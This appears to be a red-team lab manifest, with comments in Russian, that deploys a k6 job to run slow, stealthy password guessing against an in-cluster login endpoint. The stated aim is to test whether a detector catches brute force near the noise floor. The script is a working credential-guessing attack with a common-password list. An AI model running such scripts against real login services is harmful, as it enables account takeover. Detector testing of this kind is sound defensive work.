@@ -1,0 +1,55 @@
+# 23 · attack · Медленный перебор паролей (low-and-slow) на /api/auth/login.
+# ATT&CK: T1110.001 (Brute Force: Password Guessing) — стелс-вариант
+# Инструмент: k6 (constant-arrival-rate, низкий rate)
+# Ожидаемый след: слабый, «капающий» рост rps_401_403 (единицы–десятки/с), едва над нормой —
+#                 намеренно скрытный, чтобы нащупать границу чувствительности детектора.
+# Гипотеза: скрытный перебор на низком rate трудно отличить от штатных единичных 401;
+#           проверяем, ловит ли модель атаку у порога шума (в отличие от громкого brute 20).
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: attack-lowbrute-k6
+  namespace: redlab
+data:
+  script.js: |
+    import http from 'k6/http';
+    export const options = {
+      scenarios: { s: { executor: 'constant-arrival-rate',
+        rate: Number(__ENV.RATE || 10), timeUnit: '1s',
+        duration: __ENV.DURATION || '240s', preAllocatedVUs: 20, maxVUs: 100 } },
+    };
+    const URL = 'http://traefik.kube-system.svc.cluster.local/api/auth/login';
+    const pw = ['123456','password','admin','qwerty','letmein','welcome','root','test'];
+    export default function () {
+      const body = JSON.stringify({ email: 'victim@example.com',
+        password: pw[Math.floor(Math.random()*pw.length)] });
+      http.post(URL, body, { headers: { 'Content-Type': 'application/json' }, timeout: '10s' });
+    }
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: attack-lowbrute
+  namespace: redlab
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 600
+  activeDeadlineSeconds: 270
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: k6
+          image: grafana/k6:latest
+          args: ["run", "--quiet", "/scripts/script.js"]
+          env:
+            - {name: RATE, value: "10"}
+            - {name: DURATION, value: "240s"}
+          resources:
+            requests: {cpu: 100m, memory: 64Mi}
+            limits: {cpu: 500m, memory: 256Mi}
+          volumeMounts:
+            - {name: script, mountPath: /scripts}
+      volumes:
+        - name: script
+          configMap: {name: attack-lowbrute-k6}
